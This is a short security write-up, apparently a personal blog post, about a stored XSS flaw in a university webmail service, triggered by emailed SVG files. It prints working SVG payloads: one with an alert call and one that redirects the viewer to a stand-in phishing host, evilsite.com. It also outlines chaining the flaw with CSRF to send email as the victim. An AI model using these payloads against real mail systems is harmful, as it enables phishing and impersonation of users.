
## Introduction

I decided to write  a technical write-up of my first (and last) attempt to find a bug inside my university systems.
In this post I will share technical details on the xss vulnerability inside a svg file that could be chained with a csrf. 

## Xss inside svg

First of all I tried to see if there was any input not sanitized properly to try some xss but nothing, so I tried to see how webmail handled svg files with some js inside, sending svg file from my personal email to my university emails and I managed to find something good.


![unimia2](https://user-images.githubusercontent.com/59454895/113420406-90ae8c80-93c9-11eb-9aaf-f9a88da90b17.PNG)
Now i know the webmail service can handle svg files , once opened the browser parse the malicious code and we can get  the xss :

![Unimia3](https://user-images.githubusercontent.com/59454895/113420875-64474000-93ca-11eb-862a-23930a055a1c.PNG)

It works becase SVG is not a graphical format, but an XML document describing the elements that make up graphics and its additional interactions with the environment. SVG files can be an interactive document, such as HTML and can change depending on pre-programmed actions.
Just like in HTML we have a DOM tree  which is available from JS scripts. Due to the fact that HTML, JavaScript and SVG work in the same ecosystem it's easy to create an SVG file that performs malicious actions in the area of the tested web application.
Also we can see from the response header that the SVG file was interpreted as svg+xml ( there was no httponly flag).

![Unimia4](https://user-images.githubusercontent.com/59454895/113421637-be94d080-93cb-11eb-998e-4eb4d1bfd566.PNG)


The file had the following code :

```xml

<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
 
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
  <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
    <foreignObject class="node" x="46" y="22" width="200" height="300">
		  <body xmlns="http://www.w3.org/1999/xhtml">
			 <style>
				 h1{color: red}
			  </style>
			  <h1>Open me :)</h1>
	    </body>
   </foreignObject>
  <script type="text/javascript">
	  alert('1');
  </script>
</svg>
```
## Attack scenario
It's possible to trick the user into a pishing page since we can make a redirection where we want with some js  , after the the file has been opened  . It can be done with the following code inside the svg file( or we can trick him to put his credentials.)


```xml
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
   <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
   <script type="text/javascript">
             window.location.href="https://www.evilsite.com/";

   </script>
</svg>
```
The worst thing is that the token can be leaked into the attacker's server and is no longer sufficient against csrf attacks. With csrf we can for example send an email to a recipient chosen by us (such as a professor) containing an inappropriate text, without the original user noticing it.

![Unimia4](https://user-images.githubusercontent.com/59454895/113429277-8c3da000-93d8-11eb-9fe2-b8d2018a282c.PNG)


